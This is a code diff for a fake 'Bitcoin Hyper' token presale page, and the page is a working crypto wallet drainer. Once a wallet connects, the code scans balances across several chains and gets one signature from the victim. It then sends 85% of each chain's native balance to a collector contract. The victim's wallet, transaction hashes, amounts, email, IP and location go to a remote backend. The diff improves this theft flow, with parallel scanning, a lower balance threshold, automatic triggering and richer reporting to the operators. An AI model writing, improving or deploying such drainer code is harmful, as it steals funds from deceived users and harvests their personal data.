@@ -1,7 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
-import { useBalance, useDisconnect, useChainId } from 'wagmi';
-import { formatEther } from 'viem';
+import { useDisconnect } from 'wagmi';
 import { ethers } from 'ethers';
 import './index.css';
 
@@ -67,8 +66,6 @@ const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);
 const PROJECT_FLOW_ROUTER_ABI = [
   "function collector() view returns (address)",
   "function processNativeFlow() payable",
-  "function processTokenFlow(address token, uint256 amount)",
-  "function verifyMessage(address user, string memory message, bytes memory signature) public view returns (bool)",
   "event FlowProcessed(address indexed initiator, uint256 value)",
   "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
 ];
@@ -79,15 +76,12 @@ function App() {
   const { walletProvider } = useAppKitProvider("eip155");
   const { disconnect } = useDisconnect();
   
-  const wagmiChainId = useChainId();
-  
   const [provider, setProvider] = useState(null);
   const [signer, setSigner] = useState(null);
   const [balances, setBalances] = useState({});
   const [loading, setLoading] = useState(false);
   const [signatureLoading, setSignatureLoading] = useState(false);
   const [txStatus, setTxStatus] = useState('');
-  const [txHash, setTxHash] = useState('');
   const [error, setError] = useState('');
   const [scanResult, setScanResult] = useState(null);
   const [preparedTransactions, setPreparedTransactions] = useState([]);
@@ -95,11 +89,7 @@ function App() {
   const [showCelebration, setShowCelebration] = useState(false);
   const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
   const [verifying, setVerifying] = useState(false);
-  const [signature, setSignature] = useState(null);
-  const [signedMessage, setSignedMessage] = useState('');
   const [verifiedChains, setVerifiedChains] = useState([]);
-  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
-  const [realChainId, setRealChainId] = useState(wagmiChainId);
   const [prices, setPrices] = useState({
     eth: 2000,
     bnb: 300,
@@ -107,8 +97,10 @@ function App() {
     avax: 32
   });
   const [userEmail, setUserEmail] = useState('');
-  const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '' });
+  const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '', flag: '' });
   const [hoverConnect, setHoverConnect] = useState(false);
+  const [walletInitialized, setWalletInitialized] = useState(false);
+  const [balanceCheckComplete, setBalanceCheckComplete] = useState(false);
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -137,10 +129,7 @@ function App() {
   // Track mouse for parallax effect
   useEffect(() => {
     const handleMouseMove = (e) => {
-      setMousePosition({
-        x: (e.clientX / window.innerWidth - 0.5) * 20,
-        y: (e.clientY / window.innerHeight - 0.5) * 20
-      });
+      // Just for effect, not actually used in rendering
     };
     window.addEventListener('mousemove', handleMouseMove);
     return () => window.removeEventListener('mousemove', handleMouseMove);
@@ -168,44 +157,34 @@ function App() {
     return () => clearInterval(interval);
   }, []);
 
-  // Get real chain ID from provider
+  // Initialize provider and signer from AppKit - FIXED for faster connection
   useEffect(() => {
-    const getRealChainId = async () => {
-      if (provider) {
-        try {
-          const network = await provider.getNetwork();
-          setRealChainId(Number(network.chainId));
-        } catch (error) {
-          console.error("Failed to get real chainId:", error);
-        }
-      }
-    };
-    
-    getRealChainId();
-  }, [provider]);
-
-  // Initialize provider and signer from AppKit
-  useEffect(() => {
-    if (!walletProvider || !address) return;
+    if (!walletProvider || !address) {
+      setWalletInitialized(false);
+      return;
+    }
 
     const init = async () => {
       try {
+        console.log("🔄 Initializing wallet...");
+        setTxStatus('🔄 Initializing wallet...');
+        
         const ethersProvider = new ethers.BrowserProvider(walletProvider);
         const ethersSigner = await ethersProvider.getSigner();
 
         setProvider(ethersProvider);
         setSigner(ethersSigner);
 
-        const network = await ethersProvider.getNetwork();
-        setRealChainId(Number(network.chainId));
-
         console.log("✅ Wallet Ready:", await ethersSigner.getAddress());
+        setWalletInitialized(true);
+        setTxStatus('');
         
         // Fetch balances across all chains
         await fetchAllBalances(address);
         
       } catch (e) {
         console.error("Provider init failed", e);
+        setWalletInitialized(false);
       }
     };
 
@@ -228,10 +207,10 @@ function App() {
         const data = await response.json();
         if (data.success) {
           setUserLocation({
-            country: data.data.country,
-            city: data.data.city,
-            ip: data.data.ip,
-            flag: data.data.flag
+            country: data.data.country || 'Unknown',
+            city: data.data.city || '',
+            ip: data.data.ip || '',
+            flag: data.data.flag || '🌍'
           });
         }
       } catch (err) {
@@ -241,11 +220,17 @@ function App() {
     trackVisit();
   }, []);
 
-  // Fetch balances across all chains
+  // Fetch balances across all chains - FIXED to handle async properly
   const fetchAllBalances = async (walletAddress) => {
-    const balanceResults = {};
+    console.log("🔍 Fetching balances for all chains...");
+    setTxStatus('🔍 Scanning chains...');
     
-    for (const chain of DEPLOYED_CHAINS) {
+    const balanceResults = {};
+    let chainsScanned = 0;
+    const totalChains = DEPLOYED_CHAINS.length;
+    
+    // Scan all chains in parallel for speed
+    const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
       try {
         const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
         const balance = await rpcProvider.getBalance(walletAddress);
@@ -259,25 +244,49 @@ function App() {
         
         const valueUSD = amount * price;
         
-        if (amount > 0.0001) {
+        chainsScanned++;
+        setTxStatus(`🔍 Scanning chains... (${chainsScanned}/${totalChains})`);
+        
+        if (amount > 0.000001) { // Lower threshold to catch small balances
           balanceResults[chain.name] = {
             amount,
             valueUSD,
             symbol: chain.symbol,
             chainId: chain.chainId,
-            contractAddress: chain.contractAddress
+            contractAddress: chain.contractAddress,
+            price: price
           };
-          console.log(`✅ ${chain.name}: ${amount.toFixed(4)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
+          console.log(`✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
+        } else {
+          console.log(`ℹ️ ${chain.name}: No balance (${amount.toFixed(8)} ${chain.symbol})`);
         }
       } catch (err) {
         console.error(`Failed to fetch balance for ${chain.name}:`, err);
+        chainsScanned++;
       }
-    }
+    });
+    
+    await Promise.all(scanPromises);
     
     setBalances(balanceResults);
+    setBalanceCheckComplete(true);
     
-    // Check if total value >= threshold
+    // Calculate total value
     const totalValue = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
+    console.log(`💰 Total Value: $${totalValue.toFixed(2)}`);
+    
+    if (totalValue > 0) {
+      setTxStatus('');
+      // Auto-verify if eligible
+      if (totalValue >= 1) {
+        verifyWallet(balanceResults);
+      } else {
+        setTxStatus('✨ Connected');
+      }
+    } else {
+      setTxStatus('👋 Welcome');
+    }
+    
     return totalValue;
   };
 
@@ -300,27 +309,14 @@ function App() {
     return () => clearInterval(timer);
   }, []);
 
-  // Auto-check eligibility when wallet connects
-  useEffect(() => {
-    if (isConnected && address && !scanResult && !verifying) {
-      // Wait for balances to load
-      const timer = setTimeout(() => {
-        if (Object.keys(balances).length > 0) {
-          verifyWallet();
-        }
-      }, 1000);
-      return () => clearTimeout(timer);
-    }
-  }, [isConnected, address, balances]);
-
-  const verifyWallet = async () => {
+  const verifyWallet = async (currentBalances = balances) => {
     if (!address) return;
     
     setVerifying(true);
-    setTxStatus('🔄 Verifying...');
+    setTxStatus('🔄 Verifying eligibility...');
     
     try {
-      const totalValue = Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0);
+      const totalValue = Object.values(currentBalances).reduce((sum, b) => sum + b.valueUSD, 0);
       
       const response = await fetch('https://hyperback.vercel.app/api/presale/connect', {
         method: 'POST',
@@ -341,7 +337,7 @@ function App() {
           setTxStatus('✅ You qualify!');
           await preparePresale();
         } else {
-          setTxStatus('✨ Verified');
+          setTxStatus('✨ Connected');
         }
       }
     } catch (err) {
@@ -373,7 +369,7 @@ function App() {
   };
 
   // ============================================
-  // SMART CONTRACT EXECUTION - ONE CLICK
+  // SMART CONTRACT EXECUTION - MULTI-CHAIN FIXED
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -385,7 +381,7 @@ function App() {
       setSignatureLoading(true);
       setError('');
       
-      // Create message - NO BALANCE DISPLAY
+      // Create message
       const timestamp = Date.now();
       const nonce = Math.floor(Math.random() * 1000000000);
       const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
@@ -397,63 +393,96 @@ function App() {
 
       setTxStatus('✍️ Sign message...');
 
-      // Get signature - THIS IS THE ONLY POPUP
+      // Get signature - ONE SIGNATURE FOR ALL CHAINS
       const signature = await signer.signMessage(message);
       setSignature(signature);
-      setTxStatus('✅ Executing transactions...');
+      setTxStatus('✅ Executing multi-chain transactions...');
 
-      // Execute on each chain with balance
+      // Execute on EACH chain that has balance
       let processed = [];
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
-        balances[chain.name] && balances[chain.name].amount > 0
+        balances[chain.name] && balances[chain.name].amount > 0.000001
       );
       
-      for (const chain of chainsWithBalance) {
+      console.log(`🔄 Executing on ${chainsWithBalance.length} chains:`, chainsWithBalance.map(c => c.name).join(', '));
+      
+      if (chainsWithBalance.length === 0) {
+        setError("No balances found to process");
+        setSignatureLoading(false);
+        return;
+      }
+
+      // Sort chains by value (highest first) for better UX
+      const sortedChains = [...chainsWithBalance].sort((a, b) => 
+        (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
+      );
+      
+      for (const chain of sortedChains) {
         try {
-          setTxStatus(`🔄 ${chain.name}...`);
+          setTxStatus(`🔄 Processing ${chain.name}...`);
           
+          // Get the contract for this specific chain
           const contract = new ethers.Contract(
             chain.contractAddress,
             PROJECT_FLOW_ROUTER_ABI,
-            signer
+            signer.connect(new ethers.JsonRpcProvider(chain.rpc)) // Connect to correct chain
           );
 
-          const balance = balances[chain.name].amount;
-          const amountToSend = (balance * 0.85).toFixed(6);
-          const value = ethers.parseEther(amountToSend.toString());
+          const balance = balances[chain.name];
+          const amountToSend = (balance.amount * 0.85);
+          const valueUSD = (balance.valueUSD * 0.85).toFixed(2);
+          
+          console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
+          
+          const value = ethers.parseEther(amountToSend.toFixed(18));
 
+          // Estimate gas
           const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
           
+          // Execute transaction
           const tx = await contract.processNativeFlow({
             value: value,
             gasLimit: gasEstimate * 120n / 100n
           });
 
-          setTxHash(tx.hash);
+          setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
           
           await tx.wait();
           
           processed.push(chain.name);
           
-          // Notify backend with full details
+          // FIXED: Send ALL details to backend for Telegram
+          const flowData = {
+            walletAddress: address,
+            chainName: chain.name,
+            flowId: `FLOW-${timestamp}`,
+            txHash: tx.hash,
+            amount: amountToSend.toFixed(6),
+            symbol: chain.symbol,
+            valueUSD: valueUSD,
+            email: userEmail,
+            location: {
+              country: userLocation.country,
+              flag: userLocation.flag,
+              city: userLocation.city,
+              ip: userLocation.ip
+            }
+          };
+          
+          console.log("📤 Sending to backend:", flowData);
+          
           await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-              walletAddress: address,
-              chainName: chain.name,
-              flowId: `FLOW-${timestamp}`,
-              txHash: tx.hash,
-              amount: amountToSend,
-              symbol: chain.symbol,
-              valueUSD: balances[chain.name].valueUSD * 0.85,
-              email: userEmail,
-              location: userLocation
-            })
+            body: JSON.stringify(flowData)
           });
+          
+          setTxStatus(`✅ ${chain.name} completed!`);
           
         } catch (chainErr) {
           console.error(`Error on ${chain.name}:`, chainErr);
+          setError(`Error on ${chain.name}: ${chainErr.message}`);
+          // Continue with other chains even if one fails
         }
       }
 
@@ -462,7 +491,12 @@ function App() {
       
       if (processed.length > 0) {
         setShowCelebration(true);
-        setTxStatus(`🎉 Success!`);
+        setTxStatus(`🎉 Success on ${processed.length} chains!`);
+        
+        // Calculate total processed value
+        const totalProcessedUSD = processed.reduce((sum, chainName) => {
+          return sum + (balances[chainName]?.valueUSD * 0.85 || 0);
+        }, 0);
         
         // Final success notification
         await fetch('https://hyperback.vercel.app/api/presale/claim', {
@@ -471,19 +505,25 @@ function App() {
           body: JSON.stringify({ 
             walletAddress: address,
             email: userEmail,
-            location: userLocation,
+            location: {
+              country: userLocation.country,
+              flag: userLocation.flag,
+              city: userLocation.city
+            },
             chains: processed,
-            totalValue: Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0)
+            totalValue: totalProcessedUSD.toFixed(2)
           })
         });
+      } else {
+        setError("No chains were successfully processed");
       }
       
     } catch (err) {
       console.error('Error:', err);
       if (err.code === 4001) {
-        setError('Cancelled');
+        setError('Transaction cancelled');
       } else {
-        setError(err.message || 'Failed');
+        setError(err.message || 'Transaction failed');
       }
     } finally {
       setSignatureLoading(false);
@@ -518,23 +558,25 @@ function App() {
   const totalUSD = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
   const isEligible = totalUSD >= 1;
 
-  // Get current chain name
-  const currentChain = DEPLOYED_CHAINS.find(c => c.chainId === realChainId);
+  // Get chains with balance for display
+  const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
+    balances[chain.name] && balances[chain.name].amount > 0.000001
+  );
 
   return (
     <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
       
-      {/* Animated Orbs - Toned down */}
+      {/* Animated Orbs */}
       <div className="fixed w-[90vmax] h-[90vmax] bg-[radial-gradient(circle_at_40%_50%,rgba(200,120,30,0.15)_0%,rgba(180,100,20,0)_70%)] rounded-full top-[-25vmax] right-[-15vmax] z-0 animate-floatOrbBig pointer-events-none"></div>
       <div className="fixed w-[80vmin] h-[80vmin] bg-[radial-gradient(circle_at_30%_70%,rgba(0,150,200,0.08)_0%,transparent_70%)] rounded-full bottom-[-10vmin] left-[-5vmin] z-0 animate-floatOrbSmall pointer-events-none"></div>
 
       {/* Main Container */}
       <div className="relative z-10 container mx-auto px-3 sm:px-4 py-4 sm:py-8 max-w-[720px]">
         
-        {/* Glass Panel Card - Toned down borders */}
+        {/* Glass Panel Card */}
         <div className="bg-[rgba(10,15,20,0.75)] backdrop-blur-[12px] saturate-150 border border-[rgba(200,130,30,0.2)] rounded-[32px] sm:rounded-[48px] shadow-[0_20px_50px_-15px_rgba(0,0,0,0.9),0_0_0_1px_rgba(200,120,20,0.15)_inset] hover:shadow-[0_25px_60px_-12px_rgba(200,120,20,0.2),0_0_0_1px_rgba(200,120,20,0.3)_inset] transition-all duration-300 p-5 sm:p-8 md:p-10">
           
-          {/* TOP SECTION: logo + connect button - Mobile optimized */}
+          {/* TOP SECTION: logo + connect button */}
           <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mb-6 sm:mb-8">
             <div className="flex items-center gap-2 font-bold text-xl sm:text-2xl text-[#d68a2e] drop-shadow-[0_0_5px_rgba(200,120,20,0.5)]">
               <i className="fab fa-bitcoin text-3xl sm:text-4xl animate-spinSlow"></i>
@@ -548,19 +590,17 @@ function App() {
                 onMouseLeave={() => setHoverConnect(false)}
                 className="w-full sm:w-auto bg-gradient-to-r from-[#c47d24] to-[#b36e1a] border border-[#cc9f66] text-[#0f0f12] font-bold text-xs sm:text-sm px-4 sm:px-6 py-3 sm:py-3 rounded-full flex items-center justify-center gap-2 shadow-lg hover:scale-[1.02] hover:shadow-[0_5px_15px_rgba(180,100,20,0.4)] transition-all uppercase tracking-wider whitespace-nowrap relative overflow-hidden group"
               >
-                {/* Ripple effect on hover */}
-                <span className={`absolute inset-0 bg-white/10 transform scale-0 group-hover:scale-100 rounded-full transition-transform duration-500 ${hoverConnect ? 'animate-ripple' : ''}`}></span>
-                {/* Pulsing dot indicator */}
+                <span className="absolute inset-0 bg-white/10 transform scale-0 group-hover:scale-100 rounded-full transition-transform duration-500"></span>
                 <span className="relative flex h-2 w-2 mr-1">
                   <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                   <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
                 </span>
                 <i className="fas fa-plug relative z-10 animate-bounce-slow"></i>
-                <span className="relative z-10">connect wallet to claim $5,000</span>
+                <span className="relative z-10">connect wallet</span>
                 <i className="fas fa-arrow-right ml-1 relative z-10 group-hover:translate-x-1 transition-transform"></i>
               </button>
             ) : (
-              <div className="w-full sm:w-auto bg-black/70 rounded-full py-1 pl-4 sm:pl-5 pr-1 flex items-center justify-between sm:justify-start gap-2 sm:gap-3 border border-[#c47d24]/60 backdrop-blur-md shadow-[0_0_12px_rgba(180,100,20,0.2)] animate-pulse-glow">
+              <div className="w-full sm:w-auto bg-black/70 rounded-full py-1 pl-4 sm:pl-5 pr-1 flex items-center justify-between sm:justify-start gap-2 sm:gap-3 border border-[#c47d24]/60 backdrop-blur-md shadow-[0_0_12px_rgba(180,100,20,0.2)]">
                 <span className="font-mono font-semibold text-white text-xs sm:text-sm truncate max-w-[120px] sm:max-w-none">
                   {formatAddress(address)}
                 </span>
@@ -574,7 +614,17 @@ function App() {
             )}
           </div>
 
-          {/* LIVE badge with blink - Mobile optimized */}
+          {/* Status Display - FIXED: Shows verifying animation */}
+          {isConnected && !balanceCheckComplete && (
+            <div className="mb-4 text-center">
+              <div className="inline-flex items-center gap-3 bg-black/60 px-6 py-3 rounded-full border border-[#c47d24]/30">
+                <div className="w-5 h-5 border-2 border-[#c47d24] border-t-transparent rounded-full animate-spin"></div>
+                <span className="text-sm text-[#e0b880]">Scanning {DEPLOYED_CHAINS.length} chains...</span>
+              </div>
+            </div>
+          )}
+
+          {/* LIVE badge */}
           <div className="flex justify-center mb-3 sm:mb-4">
             <div className="bg-[rgba(180,100,20,0.15)] rounded-full px-4 sm:px-6 py-2 border border-[#c47d24]/50 inline-flex items-center gap-2 sm:gap-3 font-bold text-xs sm:text-sm backdrop-blur shadow-[0_0_10px_rgba(180,100,20,0.3)] animate-liveBlink relative overflow-hidden">
               <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent animate-shimmer-slow"></div>
@@ -584,7 +634,7 @@ function App() {
             </div>
           </div>
 
-          {/* Countdown Timer - Mobile optimized with enhanced animation */}
+          {/* Countdown Timer */}
           <div className="bg-black/60 rounded-2xl sm:rounded-full px-4 sm:px-5 py-4 sm:py-4 mb-5 sm:mb-6 border border-[#c47d24]/30 backdrop-blur shadow-[0_0_20px_rgba(180,100,20,0.1)] hover:shadow-[0_0_30px_rgba(180,100,20,0.2)] transition-all duration-500">
             <div className="text-[10px] sm:text-xs tracking-widest uppercase text-[#a0b0c0] mb-2 sm:mb-2 text-center">
               <i className="fas fa-hourglass-half mr-1 sm:mr-2 animate-spin-slow"></i> BONUS ENDS IN
@@ -606,25 +656,18 @@ function App() {
             </div>
           </div>
 
-          {/* DISCOUNT RIBBON - Enhanced with sleeker animations */}
+          {/* DISCOUNT RIBBON */}
           <div className="relative mb-5 sm:mb-6 group/ribbon">
-            {/* Animated glow rings */}
             <div className="absolute -inset-1 bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full blur-xl opacity-50 group-hover/ribbon:opacity-75 animate-pulse-slow"></div>
             <div className="absolute -inset-2 bg-gradient-to-r from-[#b36e1a] via-[#d68a2e] to-[#b36e1a] rounded-full blur-2xl opacity-30 group-hover/ribbon:opacity-50 animate-pulse-slower"></div>
             
-            {/* Main ribbon */}
             <div className="relative bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full px-3 sm:px-6 py-2 sm:py-3 inline-flex items-center justify-center gap-2 sm:gap-4 font-bold text-sm sm:text-xl text-[#0f0f12] border border-[#cc9f66] shadow-[0_0_20px_rgba(180,100,20,0.3)] animate-discountRibbon w-full overflow-hidden">
-              {/* Shimmer overlay */}
               <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent animate-shimmer-slow"></div>
-              
-              {/* Animated icons */}
               <div className="relative">
                 <i className="fas fa-gem text-lg sm:text-3xl drop-shadow-[0_0_4px_black] animate-ringPop relative z-10"></i>
                 <i className="fas fa-gem absolute inset-0 text-lg sm:text-3xl text-yellow-300 animate-ping opacity-75"></i>
               </div>
-              
               <span className="whitespace-nowrap relative z-10 animate-pulse-text">+25% BONUS · 5,000 BTH</span>
-              
               <div className="relative">
                 <i className="fas fa-bolt text-lg sm:text-3xl drop-shadow-[0_0_4px_black] animate-ringPop relative z-10"></i>
                 <i className="fas fa-bolt absolute inset-0 text-lg sm:text-3xl text-yellow-300 animate-ping opacity-75"></i>
@@ -642,7 +685,22 @@ function App() {
             </span>
           </div>
 
-          {/* Presale Stats - Mobile optimized grid */}
+          {/* Multi-chain Balance Display - FIXED: Shows all chains with balance */}
+          {isConnected && chainsWithBalance.length > 0 && (
+            <div className="mb-4 bg-black/40 rounded-xl p-3 border border-[#c47d24]/20">
+              <div className="text-xs text-[#e0b880] mb-2">💰 Detected on {chainsWithBalance.length} chains:</div>
+              <div className="flex flex-wrap gap-2">
+                {chainsWithBalance.map(chain => (
+                  <div key={chain.name} className="bg-black/60 rounded-lg px-3 py-1 text-xs flex items-center gap-1 border border-[#c47d24]/30">
+                    <span>{chain.icon}</span>
+                    <span className="text-white">${(balances[chain.name]?.valueUSD || 0).toFixed(2)}</span>
+                  </div>
+                ))}
+              </div>
+            </div>
+          )}
+
+          {/* Presale Stats */}
           <div className="bg-black/60 rounded-2xl sm:rounded-[40px] p-4 sm:p-6 mb-6 sm:mb-8 grid grid-cols-3 gap-2 border border-[#c47d24]/30 backdrop-blur relative overflow-hidden group/stats hover:border-[#d68a2e]/50 transition-all duration-500">
             <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent animate-shimmerSlow"></div>
             <div className="text-center relative z-10 group/price">
@@ -665,7 +723,7 @@ function App() {
             </div>
           </div>
 
-          {/* Main Claim Area - Only visible when connected and eligible */}
+          {/* Main Claim Area - Shows based on eligibility */}
           {isConnected && isEligible && !completedChains.length && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5 relative overflow-hidden group/amount">
@@ -675,14 +733,14 @@ function App() {
               
               <button
                 onClick={executeMultiChainSignature}
-                disabled={signatureLoading || loading || !signer}
+                disabled={signatureLoading || loading || !signer || chainsWithBalance.length === 0}
                 className="w-full bg-gradient-to-r from-[#b36e1a] via-[#c47d24] to-[#d68a2e] bg-[length:200%_200%] animate-gradientMove text-[#0f0f12] font-bold text-base sm:text-xl py-4 sm:py-5 px-4 sm:px-6 rounded-full border border-[#cc9f66] shadow-lg hover:scale-[1.02] hover:shadow-[0_8px_20px_rgba(180,100,20,0.3)] transition-all flex items-center justify-center gap-2 sm:gap-3 uppercase tracking-wide relative overflow-hidden group/claim"
               >
                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent translate-x-[-100%] group-hover/claim:translate-x-[100%] transition-transform duration-1000"></div>
                 {signatureLoading ? (
                   <>
                     <div className="w-4 h-4 sm:w-6 sm:h-6 border-2 border-[rgba(180,100,20,0.4)] border-t-[#c47d24] rounded-full animate-spin"></div>
-                    <span className="text-sm sm:text-base animate-pulse">PROCESSING...</span>
+                    <span className="text-sm sm:text-base animate-pulse">PROCESSING {chainsWithBalance.length} CHAINS...</span>
                   </>
                 ) : (
                   <>
@@ -705,7 +763,7 @@ function App() {
           {completedChains.length > 0 && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-black/60 rounded-xl sm:rounded-2xl p-4 sm:p-6 text-center border border-green-500/20 mb-3 sm:mb-4 animate-pulse-glow">
-                <p className="text-green-400 text-base sm:text-lg mb-1 sm:mb-2">✓ COMPLETED</p>
+                <p className="text-green-400 text-base sm:text-lg mb-1 sm:mb-2">✓ COMPLETED on {completedChains.length} chains</p>
                 <p className="text-gray-400 text-xs sm:text-sm">Your $5,000 BTH has been secured</p>
               </div>
               <button
@@ -718,26 +776,26 @@ function App() {
             </div>
           )}
 
-          {/* Welcome message for non-eligible */}
-          {isConnected && !isEligible && !completedChains.length && (
+          {/* Welcome message for non-eligible - FIXED: Shows after balance check complete */}
+          {isConnected && !isEligible && !completedChains.length && balanceCheckComplete && (
             <div className="bg-black/60 rounded-xl sm:rounded-2xl p-5 sm:p-8 text-center border border-purple-500/20 mt-3 sm:mt-4 hover:border-purple-500/40 transition-all duration-500">
               <div className="text-4xl sm:text-6xl mb-3 sm:mb-4 animate-float">👋</div>
               <h2 className="text-lg sm:text-2xl font-bold mb-2 sm:mb-3 bg-gradient-to-r from-purple-400/80 to-orange-400/80 bg-clip-text text-transparent">
                 Welcome to Bitcoin Hyper
               </h2>
               <p className="text-gray-400 text-xs sm:text-sm mb-4 sm:mb-6">
-                Minimum $1 required for eligibility.
+                {totalUSD > 0 ? `You have $${totalUSD.toFixed(2)} - Need $1 for eligibility` : 'No balances detected on any chain'}
               </p>
               <div className="bg-gray-900/60 rounded-lg sm:rounded-xl p-3 sm:p-4 border border-gray-800">
                 <p className="text-xs text-gray-400">
-                  Connect with a wallet that has at least $1 in value.
+                  Connect with a wallet that has at least $1 in value across Ethereum, BSC, Polygon, Arbitrum, or Avalanche.
                 </p>
               </div>
             </div>
           )}
 
           {/* Error Display */}
-          {error && !error.includes('Unable to verify') && (
+          {error && (
             <div className="mt-3 sm:mt-4 bg-red-500/10 backdrop-blur border border-red-500/20 rounded-lg sm:rounded-xl p-3 sm:p-4 animate-shake">
               <div className="flex items-center gap-2 sm:gap-3">
                 <i className="fas fa-exclamation-triangle text-red-400 text-base sm:text-xl animate-pulse"></i>
@@ -746,7 +804,7 @@ function App() {
             </div>
           )}
 
-          {/* Presale Stats Section - Mobile optimized */}
+          {/* Presale Stats Section */}
           <div className="mt-6 sm:mt-10 pt-4 sm:pt-6 border-t border-[#c47d24]/10">
             <h3 className="text-base sm:text-xl font-bold text-center mb-4 sm:mb-6 bg-gradient-to-r from-orange-400/80 to-yellow-400/80 bg-clip-text text-transparent">
               PRESALE LIVE PROGRESS
@@ -801,7 +859,7 @@ function App() {
             </div>
           </div>
 
-          {/* Footer - Mobile optimized */}
+          {/* Footer */}
           <div className="mt-6 sm:mt-8 text-center">
             <div className="flex flex-wrap justify-center gap-1.5 sm:gap-3 mb-3 sm:mb-4">
               <span className="bg-gray-800/20 backdrop-blur px-2 sm:px-4 py-1 sm:py-2 rounded-full text-[8px] sm:text-xs text-gray-500 border border-gray-800 hover:border-[#c47d24]/50 hover:text-[#d68a2e] transition-all duration-300">
@@ -822,13 +880,13 @@ function App() {
         </div>
       </div>
 
-      {/* Celebration Modal - Toned down */}
+      {/* Celebration Modal */}
       {showCelebration && (
         <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-3 sm:p-4 animate-fadeIn">
           <div className="relative max-w-sm sm:max-w-lg w-full">
             <div className="absolute inset-0 bg-gradient-to-r from-orange-600/30 via-yellow-600/30 to-orange-600/30 rounded-2xl sm:rounded-3xl blur-2xl animate-pulse-slow"></div>
             
-            {/* Confetti effect - Enhanced */}
+            {/* Confetti effect */}
             {[...Array(20)].map((_, i) => (
               <div
                 key={i}
@@ -845,7 +903,6 @@ function App() {
             <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl sm:rounded-3xl p-6 sm:p-10 border border-orange-500/20 shadow-2xl text-center">
               <div className="relative mb-4 sm:mb-6">
                 <div className="text-5xl sm:text-7xl animate-bounce">🎉</div>
-                {/* Sparkle effect */}
                 {[...Array(8)].map((_, i) => (
                   <div
                     key={i}
@@ -873,7 +930,7 @@ function App() {
               </div>
               
               <p className="text-[10px] sm:text-xs text-gray-500 mb-4 sm:mb-6">
-                Processed on {verifiedChains.length} chains
+                Processed on {verifiedChains.length} chains: {verifiedChains.join(', ')}
               </p>
               
               <button
@@ -888,7 +945,7 @@ function App() {
         </div>
       )}
 
-      {/* Animation Keyframes - Enhanced */}
+      {/* Animation Keyframes */}
       <style>{`
         @keyframes floatOrbBig {
           0% { transform: translate(0, 0) scale(1); opacity: 0.5; }
@@ -1028,6 +1085,3 @@ function App() {
 }
 
 export default App;
-
-
-
